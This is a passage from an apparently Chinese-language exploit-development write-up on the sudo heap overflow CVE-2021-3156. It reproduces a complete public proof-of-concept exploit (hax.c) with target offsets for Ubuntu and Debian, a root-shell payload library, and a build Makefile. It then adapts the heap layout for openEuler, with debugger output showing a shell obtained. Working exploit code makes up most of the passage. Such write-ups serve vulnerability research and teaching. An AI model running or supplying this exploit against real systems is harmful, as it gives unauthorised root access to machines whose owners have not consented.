class="number">9</span>, <span class="string">&#x27;A&#x27;</span>+i, lc_len);</span><br><span class="line">    s_envp[envp_pos++] = temp;</span><br><span class="line"></span><br><span class="line">    s_envp[envp_pos++] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;** pray for your rootshell.. **\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    execve(target-&gt;sudoedit_path, s_argv, s_envp);</span><br><span class="line">    <span class="comment">// execve(target-&gt;sudoedit_path, s_argv, NULL);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里的<code>exp</code>与原始的<code>exp</code>不同，原始的<code>exp</code>是用<code>LC_ALL</code>此时会在<code>sudo_conf_read</code>函数中调用<code>setlocale(LC_ALL, &quot;C&quot;),setlocale(LC_ALL, prev_locale)</code>会申请和释放大量的堆块，此时也会释放<code>_nl_global_locale.__names</code>中保存的堆块地址其实就是<code>newnames</code>中的堆块地址也就是存储我们环境变量值的堆块，通过释放大量的<code>0xf0</code>堆块进入<code>unsorted bin</code>，然后再申请<code>0x20</code>的时候，制造一个<code>0xd0</code>大小的<code>small bin</code>。此时还会有一个<code>unsorted bin</code>，由于在<code>get_user_info</code>会申请一个<code>0x80,0x1000</code>的堆块，此时<code>small bin,unsorted bin</code>会互换位置，也就是<code>0x80</code>大小的堆块和<code>group files service_user</code>会在<code>unsorted bin</code>相邻的位置申请，非常的巧妙。</p>
<p>初始的<code>exp</code>，<code>lib</code>，<code>Makefile</code>如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hax.c</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> ** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;</span></span><br><span class="line"><span class="comment"> ** ===========================================</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> ** Exploit for that sudo heap overflow thing everyone is talking about.</span></span><br><span class="line"><span class="comment"> ** This one aims for singleshot. Does not fuck with your system files.</span></span><br><span class="line"><span class="comment"> ** No warranties.</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> ** Shout outs to:</span></span><br><span class="line"><span class="comment"> **   Qualys      - for pumping out the awesome bugs</span></span><br><span class="line"><span class="comment"> **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)</span></span><br><span class="line"><span class="comment"> **   dsc         - for letting me rack up his electricity bill</span></span><br><span class="line"><span class="comment"> **   my wife     - for all the quality time we had to skip</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> **  Enjoy!</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> **   -- blasty // 20210130</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 512 environment variables should be enough for everyone</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ENVP 512</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="type">char</span> *target_name;</span><br><span class="line">	<span class="type">char</span> *sudoedit_path;</span><br><span class="line">	<span class="type">uint32_t</span> smash_len_a;</span><br><span class="line">	<span class="type">uint32_t</span> smash_len_b;</span><br><span class="line">	<span class="type">uint32_t</span> null_stomp_len;</span><br><span class="line">	<span class="type">uint32_t</span> lc_all_len;</span><br><span class="line">&#125; <span class="type">target_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">target_t</span> targets[] = &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Yes, same values as 20.04.1, but also confirmed.</span></span><br><span class="line">        .target_name    = <span class="string">&quot;Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">56</span>,</span><br><span class="line">        .smash_len_b    = <span class="number">54</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">63</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">212</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        .target_name    = <span class="string">&quot;Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">56</span>,</span><br><span class="line">        .smash_len_b    = <span class="number">54</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">63</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">212</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        .target_name    = <span class="string">&quot;Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">64</span>,</span><br><span class="line">        .smash_len_b    = <span class="number">49</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">60</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">214</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">usage</span><span class="params">(<span class="type">char</span> *prog)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  usage: %s &lt;target&gt;\\n\\n&quot;</span>, prog);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  available targets:\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  ------------------------------------------------------------\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(targets) / <span class="keyword">sizeof</span>(<span class="type">target_t</span>); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    %d) %s\\n&quot;</span>, i, targets[i].target_name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  ------------------------------------------------------------\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\\n** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;\\n\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        usage(argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> target_idx = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (target_idx &lt; <span class="number">0</span> || target_idx &gt;= (<span class="keyword">sizeof</span>(targets) / <span class="keyword">sizeof</span>(<span class="type">target_t</span>))) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;invalid target index\\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">target_t</span> *target = &amp;targets[ target_idx ];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;using target: &#x27;%s&#x27;\\n&quot;</span>, target-&gt;target_name);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *smash_a = <span class="built_in">calloc</span>(target-&gt;smash_len_a + <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *smash_b = <span class="built_in">calloc</span>(target-&gt;smash_len_b + <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(smash_a, <span class="string">&#x27;A&#x27;</span>, target-&gt;smash_len_a);</span><br><span class="line">    <span class="built_in">memset</span>(smash_b, <span class="string">&#x27;B&#x27;</span>, target-&gt;smash_len_b);</span><br><span class="line"></span><br><span class="line">    smash_a[target-&gt;smash_len_a] = <span class="string">&#x27;\\\\&#x27;</span>;</span><br><span class="line">    smash_b[target-&gt;smash_len_b] = <span class="string">&#x27;\\\\&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *s_argv[]=&#123;</span><br><span class="line">        <span class="string">&quot;sudoedit&quot;</span>, <span class="string">&quot;-s&quot;</span>, smash_a, <span class="string">&quot;\\\\&quot;</span>, smash_b, <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *s_envp[MAX_ENVP];</span><br><span class="line">    <span class="type">int</span> envp_pos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; target-&gt;null_stomp_len; i++) &#123;</span><br><span class="line">        s_envp[envp_pos++] = <span class="string">&quot;\\\\&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    s_envp[envp_pos++] = <span class="string">&quot;X/P0P_SH3LLZ_&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *lc_all = <span class="built_in">calloc</span>(target-&gt;lc_all_len + <span class="number">16</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(lc_all, <span class="string">&quot;LC_ALL=C.UTF-8@&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(lc_all+<span class="number">15</span>, <span class="string">&#x27;C&#x27;</span>, target-&gt;lc_all_len);</span><br><span class="line"></span><br><span class="line">    s_envp[envp_pos++] = lc_all;</span><br><span class="line">    s_envp[envp_pos++] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;** pray for your rootshell.. **\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    execve(target-&gt;sudoedit_path, s_argv, s_envp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lib.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __attribute__ ((constructor)) _init(<span class="type">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> _init(<span class="type">void</span>) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] bl1ng bl1ng! We got it!\\n&quot;</span>);</span><br><span class="line">	setuid(<span class="number">0</span>); seteuid(<span class="number">0</span>); setgid(<span class="number">0</span>); setegid(<span class="number">0</span>);</span><br><span class="line">	<span class="type">static</span> <span class="type">char</span> *a_argv[] = &#123; <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">	<span class="type">static</span> <span class="type">char</span> *a_envp[] = &#123; <span class="string">&quot;PATH=/bin:/usr/bin:/sbin&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">	execv(<span class="string">&quot;/bin/sh&quot;</span>, a_argv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">all:</span><br><span class="line">	rm -rf libnss_X</span><br><span class="line">	mkdir libnss_X</span><br><span class="line">	gcc -o sudo-hax-me-a-sandwich hax.c</span><br><span class="line">	gcc -fPIC -shared -o <span class="string">&#x27;libnss_X/P0P_SH3LLZ_.so.2&#x27;</span> lib.c</span><br><span class="line">clean:</span><br><span class="line">	rm -rf libnss_X sudo-hax-me-a-sandwich</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="For-open-euler-20-03"><a href="#For-open-euler-20-03" class="headerlink" title="For open euler 20.03"></a>For open euler 20.03</h2><p>系统类似于<code>centos</code>，我们看一下<code>/etc/nsswitch.conf</code>即配置文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">passwd:      sss files systemd</span><br><span class="line">shadow:     files sss</span><br><span class="line">group:       sss files systemd</span><br><span class="line"></span><br><span class="line">hosts:      files dns myhostname</span><br><span class="line"></span><br><span class="line">bootparams: files</span><br><span class="line"></span><br><span class="line">ethers:     files</span><br><span class="line">netmasks:   files</span><br><span class="line">networks:   files</span><br><span class="line">protocols:  files</span><br><span class="line">rpc:        files</span><br><span class="line">services:   files sss</span><br><span class="line"></span><br><span class="line">netgroup:   sss</span><br><span class="line"></span><br><span class="line">publickey:  files</span><br><span class="line"></span><br><span class="line">automount:  files sss</span><br><span class="line">aliases:    files</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到这里的顺序和服务规范和<code>ubuntu</code>下面不一样，因此这里的堆布局与<code>ubuntu</code>也不相同。我们先看一下系统的调用逻辑是否发生了改变。经过调试发现其调用逻辑与<code>ubuntu</code>下相同</p>
<p>我们将<code>ni</code>结构体手动修改如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *ni</span><br><span class="line">$4 = &#123;</span><br><span class="line">  next = 0x0,</span><br><span class="line">  actions = &#123;NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE&#125;,</span><br><span class="line">  library = 0x555555582be0,</span><br><span class="line">  known = 0x555555592b30,</span><br><span class="line">  name = 0x5555555861a0 &quot;X/P0P_SH3LLZ_ &quot;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p shlib_name</span><br><span class="line">$5 = 0x7fffffffdeb0 &quot;libnss_X/P0P_SH3LLZ_ .so.2&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2021-3156-sudo-heap-based-bufoverflow/3.png" alt="图片无法显示，请联系作者" title=" ">

<p>经过手动修改的<code>ni</code>结构体，这里继续执行就会<code>getshell</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">[+] bl1ng bl1ng! We got it!</span><br><span class="line">process 123212 is executing new program: /usr/bin/bash</span><br><span class="line">Error <span class="keyword">in</span> re-setting breakpoint 2: No <span class="built_in">source</span> file named sudo.c.</span><br><span class="line">Error <span class="keyword">in</span> re-setting breakpoint 3: No <span class="built_in">source</span> file named sudo.c.</span><br><span class="line">Error <span class="keyword">in</span> re-setting breakpoint 4: No <span class="built_in">source</span> file named sudo.c.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么接下来的问题就是如何复习这个结构体了，与<code>ubuntu</code>覆写<code>files service_user</code>不同，这里需要覆写的是<code>sss service_user</code>结构体，但是两者没有本质的区别都是<code>group</code>的第一个结构体，唯一不同的就是分配到<code>group</code>服务规范的结构体之前<code>get_user_info</code>所分配的堆块的数量，我们调试一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x400</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x228</span>) <span class="comment">// tcache</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x78</span>)<span class="comment">// 目标0x80堆块</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1000</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x17</span>) <span class="comment">// 开始为passwd分配service_user // tcache</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x34</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x36</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x38</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x17</span>) <span class="comment">// 开始为shadow分配service_user</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x36</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x34</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x16</span>)<span class="comment">// 开始为group分配service_user</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x34</span>)<span class="comment">// 这里就是sss service_user的结构体</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里我们需要提前布置<code>6</code>个<code>0x40</code>大小的堆块，和一个<code>0xc0</code>大小的堆块（这里布置<code>0x80</code>的堆块不合适，因为之后会被申请并更换为高地址的<code>0x80</code>堆块，经过测试<code>0xc0</code>大小的堆块可以。）</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> ** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;</span></span><br><span class="line"><span class="comment"> ** ===========================================</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> ** Exploit for that sudo heap overflow thing everyone is talking about.</span></span><br><span class="line"><span class="comment"> ** This one aims for singleshot. Does not fuck with your system files.</span></span><br><span class="line"><span class="comment"> ** No warranties.</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> ** Shout outs to:</span></span><br><span class="line"><span class="comment"> **   Qualys      - for pumping out the awesome bugs</span></span><br><span class="line"><span class="comment"> **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)</span></span><br><span class="line"><span class="comment"> **   dsc         - for letting me rack up his electricity bill</span></span><br><span class="line"><span class="comment"> **   my wife     - for all the quality time we had to skip</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> **  Enjoy!</span></span><br><span class="line"><span class="comment"> **</span></span><br><span class="line"><span class="comment"> **   -- blasty // 20210130</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 512 environment variables should be enough for everyone</span></span><br><span class="line"><span class="meta">#<span 